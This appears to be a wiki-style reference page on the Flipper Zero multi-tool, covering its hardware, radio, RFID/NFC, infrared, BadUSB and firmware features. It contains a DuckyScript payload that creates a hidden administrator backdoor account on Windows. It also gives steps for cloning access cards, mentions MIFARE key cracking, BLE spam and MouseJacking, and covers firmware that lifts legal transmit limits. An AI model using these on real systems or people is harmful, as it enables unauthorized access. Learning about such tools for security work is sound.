# Flipper Zero

A pocket-sized, open-source multi-tool for hardware exploration, security research, and wireless protocol interaction. Combines RFID, NFC, Sub-GHz RF, Infrared, Bluetooth, BadUSB, GPIO, and a Tamagotchi-style cyber-dolphin in one device.

- **Website:** https://flipperzero.one
- **Price:** $169 USD
- **Open source:** Hardware + firmware fully open
- **Repository:** https://github.com/flipperdevices/flipperzero-firmware

---

## Table of Contents
1. [Hardware Specifications](#1-hardware-specifications)
2. [Sub-GHz Radio](#2-sub-ghz-radio)
3. [125 kHz RFID](#3-125-khz-rfid)
4. [NFC (13.56 MHz)](#4-nfc-1356-mhz)
5. [Infrared](#5-infrared)
6. [Bluetooth & iButton](#6-bluetooth--ibutton)
7. [BadUSB](#7-badusb)
8. [GPIO & Hardware Debugging](#8-gpio--hardware-debugging)
9. [Firmware & Custom Firmware](#9-firmware--custom-firmware)
10. [WiFi Dev Board / ESP32 Integration](#10-wifi-dev-board--esp32-integration)
11. [Accessories](#11-accessories)

---

## 1. Hardware Specifications

```
Main MCU:    STM32WB55RGV6TR
             - Application core: ARM Cortex-M4 @ 64 MHz
             - Radio core: ARM Cortex-M0+ @ 32 MHz (handles BLE)
             - Flash: 1 MB (shared), SRAM: 256 KB (shared)

Sub-GHz:     Texas Instruments CC1101 transceiver
             - Frequency: 300–928 MHz (region-dependent)
             - TX power: up to +10 dBm
             - RX sensitivity: -116 dBm

NFC:         STMicroelectronics ST25R3916
             - Frequency: 13.56 MHz
             - ISO 14443A/B, ISO 15693, NFC Forum protocols

RFID:        125 kHz passive coil antenna (on dedicated PCB)
             - EM4100, HID, AWID, Indala, T5577 compatible

Infrared:    TSOP-75338 receiver + 3× transmitter LEDs
             - Range: up to 10m transmit, depends on ambient light

Display:     1.4" monochrome LCD, 128×64 px, ST7567 controller
             - Sunlight-readable, ultra-low power

Battery:     2100 mAh Li-Po
             - Charge: USB-C, 5V/1A
             - Life: up to 30 days standby

Connectivity: USB Type-C (USB 2.0)
              Bluetooth 5.0 BLE (via STM32WB radio core)

Storage:     MicroSD slot (SDXC, FAT32, up to 64+ GB)
             - Stores signals, keys, scripts, plugins (.fap files)

GPIO:        18 pins exposed on top edge
             - 3.3V logic, 5V tolerant inputs
             - UART, SPI, I2C, 1-Wire, PWM, ADC available

iButton:     3 pogo pins (rear)
             - 1-Wire protocol, Dallas keys, temperature sensors

Size:        100.3 × 40.1 × 25.6 mm (3.95" × 1.58" × 1.01")
Weight:      102 g
```

---

## 2. Sub-GHz Radio

The CC1101 chip handles radio communication in the 300–928 MHz range — the same band used by garage doors, car key fobs, remote controls, alarm sensors, and more.

```
What Flipper can do:
  Read:      Capture a radio signal (raw recording or protocol decode)
  Save:      Store the signal with name/notes to SD card
  Emulate:   Replay the captured signal
  Analyze:   Inspect frequency, modulation, data

Frequency bands (depend on region setting):
  315 MHz:   US garage doors, car remotes (older systems)
  433 MHz:   EU/Asia garage doors, weather sensors, doorbells, alarm sensors
  868 MHz:   European IoT, Z-Wave, alarm systems
  915 MHz:   US ISM band, Z-Wave US

Supported protocols (decoded, not just raw):
  CAME, FAAC, Nice, BFT (rolling codes — can READ but replay is limited)
  Static code remotes: Princeton, HCS-200 (fixed codes — fully replayable)
  Weather sensors: various formats decoded to temperature/humidity
  Subaru TPMS, car tire pressure sensors
  
Rolling code limitation:
  Modern garage door remotes use rolling codes (KeeLoq, AUT64, etc.)
  Each press generates a new code — replay attack ineffective
  Flipper records the signal but cannot generate valid new codes
  Exception: if you use the remote yourself while Flipper records — one replay works
```

### Adding Signals

```
Record new signal:
  Sub-GHz → Read RAW → point source at Flipper → press button
  Save to SD card as .sub file

Manually add by frequency:
  Sub-GHz → Saved → New File → enter frequency manually

Share with community:
  Flipper community shares .sub files for common remotes
  Check: https://github.com/UberGuidoZ/Flipper
```

---

## 3. 125 kHz RFID

Low-frequency RFID. Used in older access cards, animal microchips, and key fobs. These systems have NO authentication — anyone can read, clone, and emulate them.

```
Supported card types:
  EM4100 / EM4102:  Most common, read-only, stores 40-bit ID
  HID Prox:         HID Corporation cards (offices, doors)
  AWID 26-bit:      Common access control format
  Indala Prox:      Motorola/Indala format
  T5577:            Emulation target — writable, can be programmed to any format
  IoProx:           Kantech IoProx cards
  
Reading:
  RFID → Read → place card against back of Flipper → "Found"
  Flipper shows: protocol type, facility code, card number
  Saves to SD card as .rfid file

Emulating:
  RFID → Saved → select saved card → Emulate
  Hold Flipper to reader → reader accepts it

Writing to blank T5577 card:
  RFID → Saved → select card → Write
  Place T5577 blank card on Flipper → writes the ID
  Resulting card is a physical clone, works independently of Flipper

Security implication:
  Any 125 kHz access card can be cloned in 1 second without the cardholder noticing
  The card doesn't need to leave the holder's wallet (read through wallet at close range)
  Mitigation: use 13.56 MHz (NFC) cards with authentication instead
```

---

## 4. NFC (13.56 MHz)

High-frequency NFC. Used in credit cards, modern access control, transit cards, phone tap-to-pay.

```
Supported types:
  ISO 14443A: MIFARE Classic 1K/4K, MIFARE Ultralight, MIFARE DESFire (read)
  ISO 14443B: Some bank cards, government IDs
  ISO 15693:  Long-range NFC (iClass, some library cards)
  NFC Forum Types 1-5

Reading:
  NFC → Read → place card/phone near NFC module
  
MIFARE Classic (widely used in old transit/access systems):
  Uses 6-byte keys per sector
  Flipper attempts known default keys (0xFFFFFFFFFFFF, etc.)
  With Mfkey32 attack (from v1.0): capture nonces → crack keys offline
  
MIFARE Ultralight / NTAG:
  No authentication on most tags — can read full content
  
Bank card (VISA/Mastercard):
  Flipper CAN read: card number, expiry date from NFC field
  Flipper CANNOT: clone the card (payment has cryptographic challenge)
  No security risk from bank card NFC reading — CVV not stored on NFC
  
DESFire / ICLASS (modern secure cards):
  Encrypted — Flipper reads metadata but not encrypted data
```

---

## 5. Infrared

Flipper can receive, record, and transmit infrared signals — the same type used by TV remotes, air conditioners, projectors, and stereo systems.

```
Built-in library:
  Hundreds of pre-programmed IR codes for:
  TVs (Samsung, LG, Sony, Philips, TCL...)
  Air conditioners (Daikin, Mitsubishi, Panasonic...)
  Projectors, Blu-ray players, set-top boxes
  Universal remotes by device type
  
Recording new remote:
  Infrared → Learn New Remote → press button on any IR remote
  Flipper captures the signal, saves as .ir file
  Names it automatically or you rename
  
Transmitting:
  Infrared → Saved Remotes → select → choose button
  Range: up to 10m (line of sight)
  
Universal TV-B-Gone:
  Infrared → Universal Remotes → TV → Power Off
  Flips through hundreds of TV off codes sequentially
  Can turn off most TVs in range (common party trick)
```

---

## 6. Bluetooth & iButton

### Bluetooth

```
BLE peripheral mode: Flipper appears as BLE device
  Controlled from Flipper app (iOS/Android) via BLE
  - Update firmware over BLE
  - Remote control Flipper from phone
  - Share keys/signals between Flipper devices
  
BLE spam (via community apps):
  Send BLE advertising packets → popup spam on iOS/Android/Windows
  iOS: "New AirPods" / "Apple TV" pairing popups
  Android: Google Fast Pair notifications
  Windows: Swift Pair popups
  Mitigation: disable Bluetooth when not in use
  
HID Bluetooth:
  Flipper appears as Bluetooth keyboard/mouse to paired device
  Run DuckyScript payloads wirelessly
```

### iButton (1-Wire)

```
iButton (Dallas keys): Metal contact keys used in building access, industrial
  Flipper reads: key ID via 1-Wire protocol
  Saves, emulates, and writes to blank iButton keys
  Protocols: DS1990A (most common), DS1992, DS1996, DS199x series
  Emulation: hold pogo pins to reader to emulate saved key
```

---

## 7. BadUSB

When connected via USB to a computer, Flipper appears as a USB HID keyboard. It executes DuckyScript payloads — automating keyboard input.

```
DuckyScript example (create backdoor user on Windows):
  DELAY 1000
  GUI r                          (Win+R)
  DELAY 500
  STRING powershell -w hidden
  ENTER
  DELAY 1000
  STRING net user hacker P@ss123! /add
  ENTER
  STRING net localgroup administrators hacker /add
  ENTER

Flipper BadUSB:
  Copy .txt DuckyScript to SD card: /badusb/payload.txt
  BadUSB → select file → run
  Executes at ~1000 chars/second typing speed

Common use cases:
  Automated setup scripts (legitimate)
  CTF/pentest payload delivery (with authorization)
  Keyboard shortcut automation

Detection:
  BadUSB payloads run as keyboard input — no different from typing
  EDR may flag unusual commands
  BIOS can restrict HID device policies
```

---

## 8. GPIO & Hardware Debugging

Flipper's top GPIO header connects to external hardware — useful for hardware debugging, UART sniffing, and IoT experimentation.

```
GPIO pinout (top edge):
  Pin 1:  +5V (output when USB connected or from battery)
  Pin 2:  +3.3V (output, regulated from battery)
  Pin 3:  GND
  Pin 4:  PA7  (ADC / PWM / SPI MOSI)
  Pin 5:  PA6  (ADC / SPI MISO)
  Pin 6:  PA4  (ADC / SPI CS)
  Pin 7:  PB3  (SPI CLK)
  Pin 8:  PB2  (?)
  Pin 9:  PC3  (ADC)
  Pin 10: PC1  (ADC)
  Pin 11: PC0  (ADC)
  Pin 12: PB7  (I2C SDA)
  Pin 13: PB6  (I2C SCL)
  Pin 14: PA0  (ADC / UART TX)
  Pin 15: PA1  (UART RX)
  Pin 16: GND
  Pin 17: GND
  Pin 18: GND

Applications:
  UART sniffer: connect to UART TX/RX of any device → read serial output
  SPI flash dump: connect to SPI flash chip → read firmware
  I2C device control: connect sensors, displays to Flipper
  Logic analyzer: GPIO → Logic Analyzer app → visualize signals
  
USB converter mode:
  Connect Flipper via USB to PC
  Flipper bridges: PC USB ↔ UART/SPI/I2C/1-Wire → device under test
  Acts as a USB-to-hardware protocol adapter
```

---

## 9. Firmware & Custom Firmware

### Official Firmware

```
Released: Firmware 1.0 (September 2024) — first stable major release

Key 1.0 features:
  Dynamic app loading (FAP files from SD card — community apps)
  89 Sub-GHz radio protocols supported
  NFC subsystem rewrite (faster, more card types)
  JavaScript support for app development
  Improved BLE speed
  Month-long standby battery life

Update methods:
  qFlipper (desktop app): connect USB → click Update
  Flipper mobile app: Update over Bluetooth
  Manual: copy update.fuf file to SD → System → Update
```

### Custom Firmware

| Firmware | Focus | Notable Features |
|----------|-------|-----------------|
| **Unleashed** | Unlock region restrictions | Removes Sub-GHz region lock, extra protocols |
| **RogueMaster** | Maximum features | Everything Unleashed + extra apps bundled |
| **Momentum** | Balanced | Clean, stable, extra features without bloat |
| **xtreme** | Feature-rich | UI themes, extra apps, plugin support |

```
Why use custom firmware?
  Official firmware has Sub-GHz TX restrictions by region (legal compliance)
  Custom firmware removes these limits — USE RESPONSIBLY AND LEGALLY
  Extra protocols, community apps pre-installed
  Themes, animations, UI customizations

Install custom firmware:
  Same as official — use qFlipper or copy .tgz to SD card
  Download from respective GitHub pages
  Most popular: Unleashed https://github.com/DarkFlippers/unleashed-firmware
               Momentum  https://github.com/Next-Flip/Momentum-Firmware
```

---

## 10. WiFi Dev Board / ESP32 Integration

Flipper Zero has a WiFi Dev Board accessory (ESP32-S2 based) that plugs into the GPIO header — adding WiFi capabilities.

```
WiFi Dev Board:
  ESP32-S2 module
  Connected to Flipper via UART (GPIO pins 14,15)
  Flipper provides power via 5V/3.3V pins

Stock firmware:
  AT command firmware (send WiFi AT commands from Flipper)
  
Common alternative firmware for Dev Board:
  Marauder:  Full WiFi attack suite controlled from Flipper UI
  BlackMagic: SWD debugger probe via Flipper
  
Marauder on Dev Board:
  Flash Marauder .bin to Dev Board (see offensive-firmware.md)
  Install Marauder companion .fap on Flipper from App Catalog
  Apps → GPIO → [ESP32] WiFi Marauder → full Marauder UI on Flipper display

Dev Board Pro:
  Newer accessory with its own screen + GPS + better antenna
  Specifically designed for Marauder (named on the PCB)
```

---

## 11. Accessories

```
WiFi Dev Board / Dev Board Pro:
  ESP32-S2 (Dev Board) / ESP32-S3 (Dev Board Pro)
  WiFi capabilities, Marauder integration, GPS on Pro
  Price: ~$30 / ~$50

Video Game Module:
  Raspberry Pi Pico W
  Plug into GPIO → Flipper becomes a game controller or TV game console
  HDMI output for retro gaming

Prototyping Board:
  Breadboard-compatible breakout for GPIO
  Useful for hardware experiments

NRF24 module (community):
  Connect NRF24L01+ radio module to GPIO
  MouseJacking attacks on wireless keyboards/mice
  
External antennas:
  Aftermarket antennas for Sub-GHz and NFC range improvement
  
Cases and holsters:
  Silicone cases, belt holsters, transparent covers
  Protect screen and pogo pins
```

---

## See Also

- [ESP32 Offensive Firmware](offensive-firmware.md) — Marauder, Bruce, GhostESP for WiFi attacks
- [LilyGo Devices](lilygo-devices.md) — Alternative hardware for security testing
- [ESP32](esp32.md) — ESP32 fundamentals
- [Penetration Testing Tools](../security/penetration-testing-tools.md) — Complementary tools
